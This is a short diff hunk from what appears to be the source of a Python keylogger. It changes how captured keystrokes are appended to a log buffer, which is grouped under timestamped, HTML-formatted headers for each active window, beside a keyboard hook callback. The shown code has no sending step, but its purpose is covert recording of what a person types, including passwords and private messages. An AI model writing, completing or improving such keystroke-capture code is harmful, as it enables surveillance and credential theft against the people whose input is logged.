@@ -272,12 +272,12 @@ class Key(threading.Thread):
         new_window_title = get_window_title()
 
         if CURRENT_WINDOW_TITLE == new_window_title:
-            KEY_LOGS['logs'] += log
+            KEY_LOGS['logs'] += log.encode('utf-8')
         else:
             if KEY_LOGS.has_key('logs'):
-                KEY_LOGS['logs'] += '<br><p align="center" style="background-color: #34495e;color: #ecf0f1;"><font color="#e67e22">[%s] </font>' % get_date_time() + new_window_title + '</p><br>' + log
+                KEY_LOGS['logs'] += '<br><p align="center" style="background-color: #34495e;color: #ecf0f1;"><font color="#e67e22">[%s] </font>' % get_date_time() + new_window_title + '</p><br>' + log.encode('utf-8')
             else:
-                KEY_LOGS['logs'] = '<br><p align="center" style="background-color: #34495e;color: #ecf0f1;"><font color="#e67e22">[%s] </font>' % get_date_time() + new_window_title + '</p><br>' + log
+                KEY_LOGS['logs'] = '<br><p align="center" style="background-color: #34495e;color: #ecf0f1;"><font color="#e67e22">[%s] </font>' % get_date_time() + new_window_title + '</p><br>' + log.encode('utf-8')
             CURRENT_WINDOW_TITLE = new_window_title
 
     def hook_proc(self, n_code, w_param, l_param):
